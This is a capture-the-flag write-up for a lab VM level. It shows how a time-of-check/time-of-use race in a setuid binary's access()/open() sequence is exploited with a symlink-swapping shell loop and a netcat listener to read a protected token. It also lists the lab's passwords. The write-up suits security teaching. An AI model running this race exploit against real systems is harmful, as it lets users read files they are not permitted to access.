# Level10 - Flag10

## Local script usage

```shell
Usage: ./Ressources/main.sh
```

## Passwords and token

|         |                             |
| ------- | --------------------------- |
| level10 | `s5cAJpM8ev6XHw998pRWG728z` |
| flag10  | `woupa2yuojeeaaed06riuj63c` |
| token   | `feulo4b72j7edeahuete3no7c` |

## Steps to resolve on VM

1. Connect to `level10` user and notice there is an executable and a token file owned by `flag10` user

```bash
ssh level10@$SNOW_HOST -p 4242
# Enter the password

ls -l

> -rwsr-sr-x+ 1 flag10  level10 10817 Mar  5  2016 level10*
> -rw-------  1 flag10  flag10     26 Mar  5  2016 token
```

2. Check the files

```bash
./level10

> ./level10 file host
>        sends file to host if you have access to it
# We have here the file usage

./level10 token 127.0.0.1

> You do not have access to token
# Indeed, we don't have permissions. It does not work neither with a symbolic link.

echo abc > /tmp/abc
./level10 /tmp/abc 127.0.0.1

> Connecting to 127.0.0.1:6969 .. Unable to connect to host 127.0.0.1
# We discover here that the program uses the port 6969. Is it open ?
```

3. Listen the port 6969

Lets check listening ports :

```bash
netstat -tulpn | grep LISTEN

> tcp        0      0 0.0.0.0:4242            0.0.0.0:*               LISTEN      -
> tcp        0      0 127.0.0.1:5151          0.0.0.0:*               LISTEN      -
> tcp6       0      0 :::4646                 :::*                    LISTEN      -
> tcp6       0      0 :::4747                 :::*                    LISTEN      -
> tcp6       0      0 :::80                   :::*                    LISTEN      -
> tcp6       0      0 :::4242                 :::*                    LISTEN      -
```

It appears that we are not listening the port 6969. We need to open this port to be able to receive the file sended by the program `level10`. We can use the tool `netcat` for this job.

```bash
netcat -lk 6969
# -l    listen
# -k    keep listening
```

The VM is now listening the port 6969.

We can check it with `netstat`

```bash
netstat -tulpn | grep 6969

> tcp        0      0 0.0.0.0:6969            0.0.0.0:*               LISTEN      <PID>/netcat
```

4. Send a file with `level10` program through host:6969

The port 6969 is now open. Lets try to send a file through

```bash
echo abc > /tmp/abc
./level10 /tmp/abc 0.0.0.0

> Connecting to 0.0.0.0:6969 .. Connection from 127.0.0.1 port 6969 [tcp/*] accepted
> .*( )*.
> Connected!
> Sending file .. abc
> wrote file!
```

It works perfectly.

But we still don't have the permission to token file.

```bash
./level10 ~/token 0.0.0.0

> You do not have access to /home/user/level10/token
```

5. Explore `level10` binary

At this moment we are stuck and we need to find a way to read the token content without permissions.

Lets explore level10 binary using `nm` to list external calls

```bash
nm -u level10

>         U access@@GLIBC_2.0
>         U connect@@GLIBC_2.0
>         U exit@@GLIBC_2.0
>         U fflush@@GLIBC_2.0
>         U htons@@GLIBC_2.0
>         U inet_addr@@GLIBC_2.0
>         U open@@GLIBC_2.0
>         U printf@@GLIBC_2.0
>         U puts@@GLIBC_2.0
>         U read@@GLIBC_2.0
>         U socket@@GLIBC_2.0
>         U strerror@@GLIBC_2.0
>         U write@@GLIBC_2.0
```

What is access ?

```bash
man access
```

> NAME <br />
> access - check real user's permissions for a file <br />

> DESCRIPTION <br />
> access() checks whether the calling process can access the file pathname. If pathname is a symbolic link, it is dereferenced.

> (...)

> NOTES <br /> > **Warning**: Using access() to check if a user is authorized to, for example, open a file before actually doing so using open(2) creates a **security hole**, because **the user might exploit the short time interval between checking and opening the file** to manipulate it.

6. Exploit `access`' security hole

Lets exploit this security hole.

We have to exploit the _"short time interval between checking and opening the file"_

```bash
echo "not the token" > /tmp/isnottoken
while true; do
    ln -sf /tmp/isnottoken /tmp/token
    ln -sf ~/token /tmp/token
done
```

The symbolic link `/tmp/token` will swap very often between the file created by us and the token file, that is restricted.

We hope that access tool will authorize us to acceed to `/tmp/isnottoken` (the file created by us), and then (after changing the symlink reference) open `~/token`.

The behavior is random and needs some luck, so we need to launch multiple times the program to exploit the security hole.

```bash
for i in {1..30}; do
    ~/level10 /tmp/token 0.0.0.0
done
# Try again if necessary

> Connecting to 0.0.0.0:6969 .. .*( )*.
> Connected!
> Sending file .. not the token
> wrote file!
> You do not have access to /tmp/token
> Connecting to 0.0.0.0:6969 .. .*( )*.
> Connected!
> Sending file .. not the token
> wrote file!
> Connecting to 0.0.0.0:6969 .. .*( )*.
> Connected!
> Sending file .. woupa2yuojeeaaed06riuj63c # YEAH!
> wrote file!
```

After many tries, we can see a token: `woupa2yuojeeaaed06riuj63c` !

7. Get level flag

```bash
su flag10
# Enter password

> Don t forget to launch getflag !

getflag

> Check flag.Here is your token : feulo4b72j7edeahuete3no7c
```

---

## Sources

### Shell

- [Check ports in use](https://www.cyberciti.biz/faq/unix-linux-check-if-port-is-in-use-command/)
- [Man netcat](https://linux.die.net/man/1/nc)
- [Man nm](https://linux.die.net/man/1/nm)
- [Man access](https://linux.die.net/man/2/access)
